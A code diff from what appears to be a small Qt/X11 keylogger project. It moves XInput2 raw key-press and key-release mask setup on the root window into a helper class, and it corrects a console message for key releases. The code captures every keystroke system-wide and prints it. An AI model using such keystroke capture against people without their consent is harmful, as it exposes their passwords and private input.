@@ -2,6 +2,37 @@
 #include <exception>
 #include <iostream> // cout to show that everething works
 
+// anonymous namespace because I don't want this class to be visible from outside
+namespace {
+    // this class will setup kcatching events via:
+    // Do(Display, Window
+    class CRegisterXInput2CatchingEvents {
+    private:
+        XIEventMask X11EventMask_;
+
+    public:
+        CRegisterXInput2CatchingEvents(Display* X11Display, const Window& X11Window)
+            : X11EventMask_()
+        {
+            X11EventMask_.deviceid = XIAllMasterDevices;
+            X11EventMask_.mask_len = XIMaskLen(XI_LASTEVENT);
+            X11EventMask_.mask = new unsigned char[X11EventMask_.mask_len];
+            std::fill(X11EventMask_.mask, X11EventMask_.mask + X11EventMask_.mask_len, 0);
+
+            XISetMask(X11EventMask_.mask, XI_RawKeyPress); // maybe it should me moved from constructor into Do?
+            XISetMask(X11EventMask_.mask, XI_RawKeyRelease);
+
+            // third parameter is pointer to the array of Masks, but we have only 1 mask, so we can just take it's address
+            // last parameter is size of the array
+            XISelectEvents(X11Display, X11Window, &X11EventMask_, 1);
+        }
+
+        ~CRegisterXInput2CatchingEvents() {
+            delete[] X11EventMask_.mask;
+        }
+    };
+}
+
 CX11KeyloggerWorker::CX11KeyloggerWorker(QThread* myThread, QObject *parent)
     : QObject(parent)
     , myThread_(myThread)
@@ -21,21 +52,9 @@ CX11KeyloggerWorker::CX11KeyloggerWorker(QThread* myThread, QObject *parent)
     Window X11DefaultWindow = DefaultRootWindow(X11Display_);
 
     // Setup catching events
-    XIEventMask X11EventMask;
-    X11EventMask.deviceid = XIAllMasterDevices;
-    X11EventMask.mask_len = XIMaskLen(XI_LASTEVENT);
-    X11EventMask.mask = new unsigned char[X11EventMask.mask_len];
-    std::fill(X11EventMask.mask, X11EventMask.mask + X11EventMask.mask_len, 0);
+    CRegisterXInput2CatchingEvents(X11Display_, X11DefaultWindow);
 
-    XISetMask(X11EventMask.mask, XI_RawKeyPress);
-    XISetMask(X11EventMask.mask, XI_RawKeyRelease);
-
-    // third parameter is pointer to the array of Masks, but we have only 1 mask, so we can just take it's address
-    // last parameter is size of the array
-    XISelectEvents(X11Display_, X11DefaultWindow, &X11EventMask, 1);
     XSync(X11Display_, false);
-    delete[] X11EventMask.mask;
-
     // Done
 }
 
@@ -54,7 +73,7 @@ void CX11KeyloggerWorker::StartLogging() {
             emit RawKeyPressedSignal(*static_cast<XIRawEvent*>(X11CurrentEventCookie->data));
         }
         if (X11CurrentEventCookie->evtype == XI_RawKeyRelease) {
-            std::cout << "RawKeyPressed, Symbol: " << XKeysymToString(XkbKeycodeToKeysym(X11Display_, static_cast<XIRawEvent*>(X11CurrentEventCookie->data)->detail, 0, 0)) << std::endl;
+            std::cout << "RawKeyReleased, Symbol: " << XKeysymToString(XkbKeycodeToKeysym(X11Display_, static_cast<XIRawEvent*>(X11CurrentEventCookie->data)->detail, 0, 0)) << std::endl;
             emit RawKeyReleasedSignal(*static_cast<XIRawEvent*>(X11CurrentEventCookie->data));
         }
     }
